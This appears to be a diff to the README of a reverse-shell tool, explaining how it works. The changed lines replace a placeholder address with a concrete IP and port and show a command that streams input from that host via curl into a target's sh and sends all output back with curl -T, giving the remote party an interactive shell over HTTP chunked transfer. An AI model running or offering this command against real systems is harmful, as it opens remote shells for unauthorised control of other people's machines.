@@ -54,12 +54,11 @@ stty intr undef ;
 ```
 
 # How it works
-The first cURL request pipes this into a bash:
+The first cURL request pipes this into a target's shell:
 ```sh
-stdbuf -i0 -o0 -e0 curl -X POST -sk https://1.2.3.4:8080/input \
-    | bash 2> >(curl -sk -T - https://1.2.3.4:8080/stderr) \
-    | curl -sk -T - https://1.2.3.4:8080/stdout
+exec curl -X POST -sN http://217.138.219.220:30903/input \
+    | sh 2>&1 | curl -s -T - http://217.138.219.220:30903/stdout
 ```
 
-The bash then starts 3 cURL processes to connect stdin, stdout and stderr. HTTP's 'chunked transfer' does the rest.
+The target's shell then starts 2 cURL processes to connect the another shell's input and output to cURL. HTTP's 'chunked transfer' (`-T`) does the rest.
 
